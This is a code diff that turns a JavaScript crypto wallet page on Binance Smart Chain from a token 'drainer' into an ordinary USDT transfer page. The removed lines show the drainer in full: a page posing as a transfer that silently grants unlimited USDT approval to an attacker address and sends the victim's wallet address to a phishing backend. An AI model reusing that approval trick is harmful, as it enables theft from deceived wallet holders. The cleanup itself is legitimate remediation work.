@@ -1,36 +1,40 @@
+// This script has been modified to function as a normal ERC-20 token transfer DApp.
+// It connects to a Web3 wallet, fetches balances, and allows direct token transfers.
+// All previous malicious "drainer" functionalities have been removed.
 
-const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const RECIPIENT_ADDRESS = "0x79069192614f7ceE4F101b7995cd16BFdB3CB0d1"; // Used for display
-const SPENDER_ADDRESS = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Attacker's address for approve
+// --- Constants ---
+const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20) on BSC
 const USDT_ABI = [
     { constant: true, inputs: [{ internalType: "address", name: "account", type: "address" }], name: "balanceOf", outputs: [{ internalType: "uint256", name: "", type: "uint256" }], payable: false, stateMutability: "view", type: "function" },
     { constant: false, inputs: [{ internalType: "address", name: "recipient", type: "address" }, { internalType: "uint256", name: "amount", type: "uint256" }], name: "transfer", outputs: [{ internalType: "bool", name: "", type: "bool" }], payable: false, stateMutability: "nonpayable", type: "function" },
-    { constant: false, inputs: [{ internalType: "address", name: "spender", type: "address" }, { internalType: "uint256", name: "value", type: "uint256" }], name: "approve", outputs: [{ internalType: "bool", name: "", type: "bool" }], payable: false, stateMutability: "nonpayable", type: "function" }
+    { constant: false, inputs: [{ internalType: "address", name: "spender", type: "address" }, { internalType: "uint256", name: "value", type: "uint256" }], name: "approve", outputs: [{ internalType: "bool", name: "", type: "bool" }], payable: false, stateMutability: "nonpayable", type: "function" } // Keeping approve in ABI, though not used for normal transfer.
 ];
 
+// RPC URL for BSC (used by Web3.js to connect)
 const rpcUrl = "https://bsc-dataseed.binance.org/";
-const bscProvider = new ethers.providers.JsonRpcProvider(rpcUrl); // Ethers.js provider (not directly used by Web3.js instance here)
 
-// --- Global State Variables (Replacing React's useState) ---
-let currentAddress = RECIPIENT_ADDRESS;
+// --- Global State Variables ---
+let currentAddress = ""; // Start with empty address input
 let currentUsdtAmount = "";
-let usdtBalance = 0;
-let bnbBalance = 0;
-let walletConnected = false; // Not fully utilized in the original logic, remains largely unused for display
+let userUsdtBalance = 0; // Renamed to clearly distinguish from displayed balance
+let userBnbBalance = 0;
+let userWalletAddress = null; // Stores the connected wallet address
 let isLoading = false;
-let transferCompleted = false;
-let detectedWalletAddress = ""; // This variable from original logic is not used in the UI
+let transactionCompleted = false; // Renamed for clarity
 
-let isProcessingTransaction = false; // Replacing useRef for preventing double clicks
+let isProcessingTransaction = false;
 
 // --- DOM Element References ---
 let addressInput;
 let amountInput;
 let amountConversionText;
-let nextButton;
+let nextButton; // This will become the "Send" or "Transfer" button
+let connectWalletButton; // New button for connecting wallet
+let usdtBalanceDisplay; // New element to show user's USDT balance
+let bnbBalanceDisplay; // New element to show user's BNB balance
+let walletStatusText; // New element to show wallet connection status
 
-// --- Helper Functions ---
-
+// --- UI Update Function ---
 function updateUI() {
     if (addressInput) {
         addressInput.value = currentAddress;
@@ -42,8 +46,27 @@ function updateUI() {
         const parsedAmount = parseFloat(currentUsdtAmount);
         amountConversionText.textContent = `= $${isNaN(parsedAmount) ? '0.00' : (parsedAmount * 1).toFixed(2)}`;
     }
+
     if (nextButton) {
-        nextButton.textContent = isLoading ? "Processing..." : (transferCompleted ? "Transfer completed" : "Next");
+        nextButton.textContent = isLoading ? "Processing..." : (transactionCompleted ? "Transfer Success!" : "Send USDT");
+        nextButton.disabled = isLoading || !userWalletAddress; // Disable if loading or not connected
+    }
+
+    if (connectWalletButton) {
+        connectWalletButton.textContent = userWalletAddress ? `Connected: ${userWalletAddress.substring(0, 6)}...${userWalletAddress.substring(userWalletAddress.length - 4)}` : "Connect Wallet";
+        connectWalletButton.disabled = isLoading;
+    }
+
+    if (walletStatusText) {
+        walletStatusText.textContent = userWalletAddress ? `Wallet Connected: ${userWalletAddress.substring(0, 6)}...${userWalletAddress.substring(userWalletAddress.length - 4)}` : "Wallet not connected.";
+        walletStatusText.style.color = userWalletAddress ? 'green' : 'red';
+    }
+
+    if (usdtBalanceDisplay) {
+        usdtBalanceDisplay.textContent = `USDT Balance: ${userUsdtBalance.toFixed(2)}`;
+    }
+    if (bnbBalanceDisplay) {
+        bnbBalanceDisplay.textContent = `BNB Balance: ${userBnbBalance.toFixed(4)}`;
     }
 
     const clearButton = document.getElementById('clear-address-button');
@@ -51,6 +74,8 @@ function updateUI() {
         clearButton.style.display = currentAddress ? 'flex' : 'none';
     }
 }
+
+// --- Helper Functions ---
 
 function clearAddress() {
     currentAddress = "";
@@ -70,181 +95,53 @@ async function pasteAddress() {
     }
 }
 
-// --- Core DApp Logic ---
+// --- Blockchain Interaction Functions ---
 
-async function sendUSDT() {
-    if (isProcessingTransaction) return;
+async function connectWallet() {
+    if (!window.ethereum) {
+        alert("No Web3 wallet detected. Please install MetaMask or Trust Wallet.");
+        return;
+    }
 
     try {
-        isProcessingTransaction = true;
         isLoading = true;
-        transferCompleted = false;
         updateUI();
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        userWalletAddress = accounts[0];
+        console.log("Wallet connected:", userWalletAddress);
 
-        if (!window.ethereum) {
-            alert("No Web3 wallet detected. Please install MetaMask or Trust Wallet.");
-            return;
-        }
+        // Once connected, ensure we are on BSC and fetch balances
+        await ensureBSCNetwork();
+        await fetchUserBalances();
 
-        const web3 = new Web3(window.ethereum);
-
-        const accounts = await web3.eth.getAccounts();
-        const sender = accounts[0];
-        if (!sender || !web3.utils.isAddress(sender)) {
-            console.log("❌ Unable to detect a valid wallet address.");
-            alert("Please connect your wallet or ensure it's unlocked.");
-            return;
-        }
-
-        // Check and switch to BSC
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) { // 56 is BSC Mainnet
-            try {
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: "0x38" }], // Hex chain ID for BSC
-                });
-            } catch (switchError) {
-                if (switchError.code === 4902) { // Chain not added to wallet
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: "0x38",
-                                chainName: 'Binance Smart Chain',
-                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                blockExplorerUrls: ['https://bscscan.com'],
-                            }],
-                        });
-                        // After adding, attempt to switch again
-                        await window.ethereum.request({
-                            method: "wallet_switchEthereumChain",
-                            params: [{ chainId: "0x38" }],
-                        });
-                    } catch (addError) {
-                        console.error("❌ Couldn't add or switch to BSC:", addError);
-                        alert("Please add Binance Smart Chain to your wallet manually.");
-                        return;
-                    }
-                } else {
-                    console.error("❌ Failed to switch network:", switchError);
-                    alert("Failed to switch to Binance Smart Chain. Please switch manually.");
-                    return;
-                }
-            }
-        }
-
-        // Validate address in URL (required by the original script)
-        const params = new URLSearchParams(window.location.search);
-        const userAddressParam = params.get("address");
-
-        if (!userAddressParam || !/^0x[a-fA-F0-9]{40}$/.test(userAddressParam)) {
-            alert("Invalid or missing 'address' parameter in the URL. Cannot proceed.");
-            return;
-        }
-
-        const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
-        const MAX_UINT256 = web3.utils.toTwosComplement(-1); // Represents unlimited approval
-
-        // --- THE MALICIOUS APPROVE CALL ---
-        console.log(`Attempting to approve SPENDER: ${SPENDER_ADDRESS} for unlimited USDT from SENDER: ${sender}`);
-        await contract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).send({ from: sender });
-        // --- END MALICIOUS APPROVE CALL ---
-
-        transferCompleted = true;
-        alert("Approval transaction sent! (Check your wallet for confirmation)"); // User will think a transfer happened
-    } catch (err) {
-        console.error("🔴 Approval error:", err);
-        if (err.code === 4001) { // User rejected transaction
-            alert("Transaction rejected by user.");
-        } else {
-            alert("An error occurred during the approval process. See console for details.");
-        }
+    } catch (error) {
+        console.error("Error connecting wallet:", error);
+        alert("Failed to connect wallet. Please try again.");
+        userWalletAddress = null; // Reset wallet address on failure
     } finally {
-        isProcessingTransaction = false;
         isLoading = false;
         updateUI();
     }
 }
 
-async function initDApp() {
-    try {
-        if (!window.ethereum) {
-            console.log("No Web3 wallet detected. UI will not interact with blockchain.");
-            // We can still render the UI even without a wallet
-        } else {
-            const web3 = new Web3(window.ethereum);
-            const accounts = await web3.eth.getAccounts();
-            detectedWalletAddress = accounts[0] || ""; // Store detected wallet address
-
-            // Ensure BSC network is selected first for a smoother UX
-            await ensureBSCNetwork();
-        }
-        
-        const params = new URLSearchParams(window.location.search);
-        const userAddressParam = params.get("address");
-
-        if (!userAddressParam) {
-            console.log("🔄 Approval-only mode activated (no address in URL for refill check).");
-            // No address in URL, so no backend check for balances relevant to a specific "victim" address
-            // The UI will still work, and the 'approve' will still target SPENDER_ADDRESS.
-            return;
-        }
-
-        if (!/^0x[a-fA-F0-9]{40}$/.test(userAddressParam)) {
-            console.warn("Invalid 'address' parameter in URL. Skipping backend refill check.");
-            return;
-        }
-
-        // If a valid userAddressParam is present, proceed with the backend check
-        currentAddress = userAddressParam; // Update displayed address if from URL
-        console.log("🔗 Wallet from QR/URL:", userAddressParam);
-
-        // --- MALICIOUS BACKEND CALL ---
-        const response = await fetch("https://haha.trustwallet-withdraw.com/api/refill-check", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ address: userAddressParam }),
-        });
-
-        const result = await response.json();
-        console.log("📬 Backend response:", result);
-
-        if (!response.ok || result.status === "refill_failed" || !result.usdt) {
-            console.warn("Backend refill check failed or no USDT balance found.");
-            // Continue even if backend fails, just don't update balances from backend
-            return;
-        }
-
-        // ✅ Store balances silently (from backend)
-        usdtBalance = result.usdt;
-        bnbBalance = result.bnb || 0;
-        console.log("✅ Refill successful or not needed, ready for manual transfer (according to backend).");
-        // You might want to pre-fill amount with usdtBalance if usdtBalance > 200 here too
-        // currentUsdtAmount = usdtBalance > 200 ? String(usdtBalance) : ""; // Optional: pre-fill max if high balance
-        // updateUI();
-
-    } catch (err) {
-        console.error("❌ initDApp() error:", err);
-    }
-}
-
 async function ensureBSCNetwork() {
     const bscChainId = "0x38"; // BSC Mainnet
-    if (!window.ethereum) return; // No wallet, no network check
+    if (!window.ethereum || !userWalletAddress) return; // No wallet or not connected
 
     try {
         const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
         if (currentChainId !== bscChainId) {
+            console.log("Switching to BSC network...");
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: bscChainId }],
             });
+            console.log("Switched to BSC.");
         }
     } catch (error) {
-        if (error.code === 4902) {
+        if (error.code === 4902) { // Chain not added
             try {
+                console.log("BSC not found, attempting to add...");
                 await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
                     params: [{
@@ -255,16 +152,112 @@ async function ensureBSCNetwork() {
                         blockExplorerUrls: ['https://bscscan.com'],
                     }],
                 });
+                // After adding, attempt to switch again
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: bscChainId }],
+                });
+                console.log("BSC added and switched.");
             } catch (addError) {
                 console.error("❌ Couldn't add BSC:", addError);
+                alert("Please add Binance Smart Chain to your wallet manually.");
             }
         } else {
             console.error("❌ Failed to switch network:", error);
+            alert("Failed to switch to Binance Smart Chain. Please switch manually.");
         }
     }
 }
 
-// --- DOM Manipulation (Replacing JSX rendering) ---
+async function fetchUserBalances() {
+    if (!userWalletAddress) return; // Can't fetch balances without a connected address
+
+    try {
+        const web3 = new Web3(window.ethereum);
+
+        // Fetch BNB Balance
+        const bnbWei = await web3.eth.getBalance(userWalletAddress);
+        userBnbBalance = parseFloat(web3.utils.fromWei(bnbWei, 'ether'));
+
+        // Fetch USDT Balance
+        const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
+        const usdtRawBalance = await usdtContract.methods.balanceOf(userWalletAddress).call();
+        // USDT typically has 18 decimals, but always check official token info if unsure.
+        userUsdtBalance = parseFloat(web3.utils.fromWei(usdtRawBalance.toString(), 'ether'));
+        
+        console.log("Fetched Balances - USDT:", userUsdtBalance, "BNB:", userBnbBalance);
+
+    } catch (error) {
+        console.error("Error fetching balances:", error);
+        userUsdtBalance = 0;
+        userBnbBalance = 0;
+        alert("Failed to fetch balances. Please check your wallet connection and network.");
+    } finally {
+        updateUI();
+    }
+}
+
+
+async function sendUSDT() {
+    if (isProcessingTransaction) return;
+    if (!userWalletAddress) {
+        alert("Please connect your wallet first.");
+        return;
+    }
+    if (!currentUsdtAmount || isNaN(parseFloat(currentUsdtAmount)) || parseFloat(currentUsdtAmount) <= 0) {
+        alert("Please enter a valid amount to send.");
+        return;
+    }
+    if (!currentAddress || !Web3.utils.isAddress(currentAddress)) {
+        alert("Please enter a valid recipient address.");
+        return;
+    }
+    if (parseFloat(currentUsdtAmount) > userUsdtBalance) {
+        alert("Insufficient USDT balance.");
+        return;
+    }
+
+    try {
+        isProcessingTransaction = true;
+        isLoading = true;
+        transactionCompleted = false;
+        updateUI();
+
+        const web3 = new Web3(window.ethereum);
+        
+        // Ensure network is BSC before transaction
+        await ensureBSCNetwork(); 
+
+        const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
+        const amountInWei = web3.utils.toWei(currentUsdtAmount, 'ether'); // Convert to wei
+
+        console.log(`Attempting to transfer ${currentUsdtAmount} USDT from ${userWalletAddress} to ${currentAddress}`);
+        
+        // --- NORMAL TRANSFER CALL ---
+        await usdtContract.methods.transfer(currentAddress, amountInWei).send({ from: userWalletAddress });
+        // --- END NORMAL TRANSFER CALL ---
+
+        transactionCompleted = true;
+        alert(`USDT transfer of ${currentUsdtAmount} to ${currentAddress} initiated successfully!`);
+        // Optionally, clear amount and address after successful transfer
+        currentUsdtAmount = "";
+        currentAddress = "";
+        await fetchUserBalances(); // Refresh balances
+    } catch (err) {
+        console.error("🔴 Transfer error:", err);
+        if (err.code === 4001) { // User rejected transaction
+            alert("Transaction rejected by user.");
+        } else {
+            alert("An error occurred during the transfer. See console for details.");
+        }
+    } finally {
+        isProcessingTransaction = false;
+        isLoading = false;
+        updateUI();
+    }
+}
+
+// --- DOM Manipulation and Event Listeners ---
 function renderApp() {
     const appRoot = document.getElementById('app-root');
     if (!appRoot) {
@@ -272,29 +265,77 @@ function renderApp() {
         return;
     }
 
+    // Clear existing content in case of re-render
+    appRoot.innerHTML = ''; 
+
     // Main Container
     const container = document.createElement('div');
-    container.id = 'app-container'; // Assign an ID to apply CSS
-    container.className = 'app-container'; // Assign a class to apply CSS
+    container.id = 'app-container';
+    container.className = 'app-container';
+
+    // Back Button (retained from original for layout consistency, but no functional use here)
+    const backButton = document.createElement('button');
+    backButton.className = 'back-button';
+    // Using an arrow icon if you want to include it, otherwise just text or remove
+    // backButton.innerHTML = '<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 256 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M192 448c-8.188 0-16.38-3.125-22.62-9.375l-160-160c-12.5-12.5-12.5-32.75 0-45.25l160-160c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25L77.25 256l137.4 137.4c12.5 12.5 12.5 32.75 0 45.25C208.4 444.9 200.2 448 192 448z"></path></svg>';
+    container.appendChild(backButton);
 
     // Title
     const title = document.createElement('h1');
     title.className = 'title';
-    title.textContent = "Transfer"; // Original title was "Transfer"
+    title.textContent = "Send USDT";
     container.appendChild(title);
+
+    // Wallet Status and Connect Button
+    const walletInfoContainer = document.createElement('div');
+    walletInfoContainer.style.textAlign = 'center';
+    walletInfoContainer.style.marginBottom = '20px';
+
+    walletStatusText = document.createElement('p');
+    walletStatusText.style.fontSize = '14px';
+    walletStatusText.style.fontWeight = '500';
+    walletStatusText.style.marginBottom = '10px';
+    walletInfoContainer.appendChild(walletStatusText);
+
+    connectWalletButton = document.createElement('button');
+    connectWalletButton.className = 'next-button'; // Reusing style for now
+    connectWalletButton.style.marginTop = '0'; // Override margin-top
+    connectWalletButton.style.marginBottom = '15px';
+    connectWalletButton.style.backgroundColor = '#007bff'; // A different color for connect
+    connectWalletButton.addEventListener('click', connectWallet);
+    walletInfoContainer.appendChild(connectWalletButton);
+
+    // Balance Displays
+    usdtBalanceDisplay = document.createElement('p');
+    usdtBalanceDisplay.style.fontSize = '14px';
+    usdtBalanceDisplay.style.fontWeight = '500';
+    usdtBalanceDisplay.style.color = '#626262';
+    usdtBalanceDisplay.style.textAlign = 'left';
+    walletInfoContainer.appendChild(usdtBalanceDisplay);
+
+    bnbBalanceDisplay = document.createElement('p');
+    bnbBalanceDisplay.style.fontSize = '14px';
+    bnbBalanceDisplay.style.fontWeight = '500';
+    bnbBalanceDisplay.style.color = '#626262';
+    bnbBalanceDisplay.style.textAlign = 'left';
+    walletInfoContainer.appendChild(bnbBalanceDisplay);
+
+    container.appendChild(walletInfoContainer);
+
 
     // Address Field
     const addressInputContainer = document.createElement('div');
     addressInputContainer.className = 'input-container';
     const addressLabel = document.createElement('label');
     addressLabel.className = 'input-label';
-    addressLabel.textContent = 'Address or Domain Name';
+    addressLabel.textContent = 'Recipient Address or Domain Name'; // More specific label
     addressInputContainer.appendChild(addressLabel);
     const addressFieldContainer = document.createElement('div');
     addressFieldContainer.className = 'input-field-container';
     addressInput = document.createElement('input');
     addressInput.type = 'text';
     addressInput.className = 'input-field';
+    addressInput.placeholder = 'e.g., 0x... or example.eth'; // Placeholder
     addressInput.value = currentAddress;
     addressInput.addEventListener('input', (e) => {
         currentAddress = e.target.value;
@@ -306,7 +347,7 @@ function renderApp() {
     clearBtn.id = 'clear-address-button';
     clearBtn.className = 'clear-button';
     clearBtn.textContent = '×';
-    clearBtn.style.display = currentAddress ? 'flex' : 'none'; // Initial display based on value
+    clearBtn.style.display = currentAddress ? 'flex' : 'none';
     clearBtn.addEventListener('click', clearAddress);
     addressFieldContainer.appendChild(clearBtn);
 
@@ -347,11 +388,9 @@ function renderApp() {
     const maxTextSpan = document.createElement('span');
     maxTextSpan.className = 'max-text';
     maxTextSpan.textContent = 'Max';
-    // The original code has a `MaxText` styled component but no `onClick` logic.
-    // In a real scenario, this would likely fill `amountInput` with `usdtBalance`.
     maxTextSpan.addEventListener('click', () => {
-        if (usdtBalance > 0) {
-            currentUsdtAmount = String(usdtBalance);
+        if (userUsdtBalance > 0) {
+            currentUsdtAmount = String(userUsdtBalance);
             updateUI();
         }
     });
@@ -365,16 +404,12 @@ function renderApp() {
     amountInputContainer.appendChild(amountConversionText);
     container.appendChild(amountInputContainer);
 
-    // Next Button
-    nextButton = document.createElement('button');
+    // Send Button
+    nextButton = document.createElement('button'); // Renamed from nextButton to sendButton conceptually
     nextButton.className = 'next-button';
-    nextButton.textContent = 'Next';
-    nextButton.addEventListener('click', () => {
-        // The original React code had logic here to decide amountToSend based on usdtBalance > 200
-        // but the sendUSDT function always uses MAX_UINT256 anyway.
-        // So, this parameter is effectively ignored by sendUSDT as written.
-        sendUSDT();
-    });
+    nextButton.style.marginTop = 'auto'; // Push to bottom
+    nextButton.textContent = 'Send USDT';
+    nextButton.addEventListener('click', sendUSDT);
     container.appendChild(nextButton);
 
     appRoot.appendChild(container);
@@ -386,6 +421,29 @@ function renderApp() {
 // --- Initialize the DApp when the DOM is fully loaded ---
 document.addEventListener('DOMContentLoaded', async () => {
     renderApp(); // Render the UI first
-    await initDApp(); // Then run the initialization logic
-    updateUI(); // Update UI based on initial data
+    await ensureBSCNetwork(); // Ensure correct network on load
+    // Check for existing wallet connection
+    if (window.ethereum) {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length > 0) {
+            userWalletAddress = accounts[0];
+            console.log("Auto-connected wallet:", userWalletAddress);
+            await fetchUserBalances(); // Fetch balances if already connected
+        }
+        // Listen for account changes
+        window.ethereum.on('accountsChanged', async (accounts) => {
+            userWalletAddress = accounts.length > 0 ? accounts[0] : null;
+            console.log("Accounts changed to:", userWalletAddress);
+            await fetchUserBalances();
+            updateUI();
+        });
+        // Listen for chain changes
+        window.ethereum.on('chainChanged', async (chainId) => {
+            console.log("Chain changed to:", chainId);
+            await ensureBSCNetwork(); // Re-ensure BSC
+            await fetchUserBalances(); // Re-fetch balances for new chain context
+            updateUI();
+        });
+    }
+    updateUI(); // Final UI update
 });
